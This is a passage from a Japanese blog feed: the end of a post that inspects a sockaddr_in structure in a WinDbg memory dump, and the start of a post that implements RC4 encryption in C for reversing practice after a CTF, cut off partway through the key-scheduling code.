&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sockaddr_in&lt;/code&gt;構造体は、ポートとアドレスファミリの領域にそれぞれ2バイトずつ、IPアドレスに4バイト、システム予約領域に8バイトを使用します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 517px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/96374987ee5c17149aca7c34d5cbca5d/fa2f5/image-1.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 31.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLUlEQVQY0z1Q2XKDMAzk/7+pR6ZpmplCOGxjbgwEQogh6R9sJWcmDzuWtdJKKy/LMhy+D+D3FIbY77+QJAmapkFRFOj7HmVZoqprdF3nch3l7vc7tnXFtm0vPB5/8LTOcDz+QKUaDTUFQYCcxFnUxXmOkAZFceyG+r6PnESHoXfiVVU5lARrN3hCCOx2nwijGD1tIKUk4ed2aZqiaVsnlGU5WtpaKQVjOudAiMT9FfVIJXG7rfCKoqSpv9DUNJCVVGu0JMJTWcgY48S5zpgWmni2zMOZf3JPuA2jKMLH+xv84ERCDW0avbZj23w/SS6kVC6OyXpNp6nrysVCCrBLxrJYeOM4USHf5Ix1tRjHkYgF8zxjmiayccPlciHMFC+Ot9bCUp555vjl+ut8xT8XoqsBy1ipXAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/96374987ee5c17149aca7c34d5cbca5d/8ac56/image-1.webp 240w,
/static/96374987ee5c17149aca7c34d5cbca5d/d3be9/image-1.webp 480w,
/static/96374987ee5c17149aca7c34d5cbca5d/7f59e/image-1.webp 517w&quot;
              sizes=&quot;(max-width: 517px) 100vw, 517px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/96374987ee5c17149aca7c34d5cbca5d/8ff5a/image-1.png 240w,
/static/96374987ee5c17149aca7c34d5cbca5d/e85cb/image-1.png 480w,
/static/96374987ee5c17149aca7c34d5cbca5d/fa2f5/image-1.png 517w&quot;
            sizes=&quot;(max-width: 517px) 100vw, 517px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/96374987ee5c17149aca7c34d5cbca5d/fa2f5/image-1.png&quot;
            alt=&quot;image-1.png&quot;
            title=&quot;image-1.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このまま処理を進めていくと、空だったメモリの領域にポート番号、アドレスファミリ、IPアドレスが設定されました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 496px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/28807a629a0e13d12b351cd801596f5c/bb630/image-2.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABG0lEQVQY01WR246DMAxE+f+PW4rEnVYQCBAuCS1U7bbqdtY26kMfRrHI2HMcPN3USLMcwzBA6wZBECAvjrher1iWBeu6Yp5nDOOIxTnxGWPw+3jg9Xrhfr/h8Xzi/X7jj+SlaYIf30dxPGKipjAMUVUVmqZBEsdSn04n+h6hrmtkaYooiuDcgq7rUJWleBlG6xZeVZWIkwRK1bhcLmKapgnWWqlnOh2p740Qj+MglLyBoZM9rLZt0fU9vDzP4B8OKIqCUi1KSmQDN3Hdk8mYXkhH2oBplFISzkO4ZnIR3XmMvBMqnM9nwtbSyO/GNdOyuNlaB0MBHLht2xehiAk/A0siWL9WdvvKNNjaWUj53T4/hVfm4H0Ds4vu/gFdE7teJSikEQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/28807a629a0e13d12b351cd801596f5c/8ac56/image-2.webp 240w,
/static/28807a629a0e13d12b351cd801596f5c/d3be9/image-2.webp 480w,
/static/28807a629a0e13d12b351cd801596f5c/6f16c/image-2.webp 496w&quot;
              sizes=&quot;(max-width: 496px) 100vw, 496px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/28807a629a0e13d12b351cd801596f5c/8ff5a/image-2.png 240w,
/static/28807a629a0e13d12b351cd801596f5c/e85cb/image-2.png 480w,
/static/28807a629a0e13d12b351cd801596f5c/bb630/image-2.png 496w&quot;
            sizes=&quot;(max-width: 496px) 100vw, 496px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/28807a629a0e13d12b351cd801596f5c/bb630/image-2.png&quot;
            alt=&quot;image-2.png&quot;
            title=&quot;image-2.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このままだと少しわかりづらいので表示を変えてみました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; dyb 0055d810
          76543210 76543210 76543210 76543210
          &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;
0055d810  00000010 00000000 00000000 01010000  02 00 00 50
0055d814  10101001 11111110 01100100 00011110  a9 fe 64 1e
0055d818  00000000 00000000 00000000 00000000  00 00 00 00
0055d81c  00000000 00000000 00000000 00000000  00 00 00 00&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ポート番号80が&lt;code class=&quot;language-text&quot;&gt;0x0050&lt;/code&gt;とネットワークバイトオーダ（ビッグエンディアン）形式で格納されています。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;0x55d814&lt;/code&gt;からの4バイトは、IPアドレスが同じくネットワークバイトオーダで格納されています。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;年の瀬にソケットプログラミングとリバーシングなどをしてました。&lt;/p&gt;
&lt;p&gt;来年も良い年になるとよいですね。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[C言語でRC4暗号を実装してGhidraとWinDbgでリバーシングしてみる]]></title><link>https://kashiwaba-yuki.com/windows-windbg-011-rc4</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-011-rc4</guid><pubDate>Sat, 01 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;今回はC言語でRC4暗号を実装してWinDbgでリバーシングしてみたいと思います。&lt;/p&gt;
&lt;p&gt;2021/12/24に開催されていた&lt;a href=&quot;https://harekaze.com/ctf/2021.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Harekaze mini CTF 2021&lt;/a&gt;のRev問で静的解析からRC4暗号が使われていることを見抜く問題があったのですが、残念ながらデコンパイル結果から見抜くことができませんでした。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/TeamHarekaze/harekaze-mini-ctf-2021-challenges-public/blob/main/rev/pack-program/solution/Pack%20Program-solve.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;harekaze-mini-ctf-2021 Pack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そこで、今回は復習を兼ねて実際に自分でRC4暗号を実装し、リバーシングしてみたいと思います。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#rc4%E6%9A%97%E5%8F%B7%E3%81%A8%E3%81%AF&quot;&gt;RC4暗号とは&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0%E6%9A%97%E5%8F%B7&quot;&gt;ストリーム暗号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#rc4%E6%9A%97%E5%8F%B7&quot;&gt;RC4暗号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ksa&quot;&gt;KSA&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#prga%E3%81%A7%E9%8D%B5%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0%E3%82%92%E7%94%9F%E6%88%90%E3%81%97%E3%81%A6%E6%9A%97%E5%8F%B7%E5%8C%96&quot;&gt;PRGAで鍵ストリームを生成して暗号化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%BE%A9%E5%8F%B7&quot;&gt;復号&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89&quot;&gt;ソースコード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#rc4%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B7%E3%83%B3%E3%82%B0%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot;&gt;RC4プログラムをリバーシングしてみる&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB&quot;&gt;呼び出し関数のデコンパイル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot;&gt;TTDトレースを解析する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ksa%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB&quot;&gt;KSAのデコンパイル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#prga%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB&quot;&gt;PRGAのデコンパイル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%BF%BD%E8%A8%98202212&quot;&gt;追記(2022/1/2)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;rc4暗号とは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#rc4%E6%9A%97%E5%8F%B7%E3%81%A8%E3%81%AF&quot; aria-label=&quot;rc4暗号とは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RC4暗号とは&lt;/h2&gt;
&lt;p&gt;RC4暗号はWEPやSSL通信などに使用されていたストリーム暗号の一種です。&lt;/p&gt;
&lt;p&gt;現在は脆弱性が広く知られており、使用は推奨されておりません。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/RC4&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;RC4 - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ストリーム暗号&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0%E6%9A%97%E5%8F%B7&quot; aria-label=&quot;ストリーム暗号 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ストリーム暗号&lt;/h3&gt;
&lt;p&gt;ストリーム暗号は対象暗号(暗号化と復号に同じ鍵を使用する暗号)の一種で、bitごと、あるいはバイトごとに逐次暗号化を行っていく方式です。&lt;/p&gt;
&lt;p&gt;ストリーム暗号以外の対象暗号としてはブロック暗号があり、ストリーム暗号と比較されることが多いです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3zi4Pew&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;暗号技術 実践活用ガイド&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;rc4暗号&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#rc4%E6%9A%97%E5%8F%B7&quot; aria-label=&quot;rc4暗号 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RC4暗号&lt;/h3&gt;
&lt;p&gt;RC4暗号は、ストリーム暗号なので、生成した疑似乱数列と平文の排他的論理和を取ることで暗号化を行います。&lt;/p&gt;
&lt;p&gt;RC4による暗号化は、ざっくり以下の流れです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;与えられた鍵を元に、KSAによって暗号化に使用する鍵ストリームを生成するための初期ステートSを生成します&lt;/li&gt;
&lt;li&gt;初期ステートSを使い、PRGA(疑似乱数生成アルゴリズム)で平文を暗号化する鍵ストリームを生成します&lt;/li&gt;
&lt;li&gt;生成した鍵ストリームを用いて平文をXOR暗号化します&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ksa&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ksa&quot; aria-label=&quot;ksa permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;KSA&lt;/h3&gt;
&lt;p&gt;RC4暗号では、あらかじめ定義された配列S	を使用し、KSA(キースケージュールアルゴリズム)を用いて配列Sの初期化を行います。&lt;/p&gt;
&lt;p&gt;実装はWikipediaのサンプルを参考にしています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/RC4&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;RC4 - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;N&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; tmp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; tmp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;KSA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// 配列Sの初期化(S[0]=0, S[1]=1....S[255]=255)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;token comment&quot;&gt;// KSAで初期ストリームを生成&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;j&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
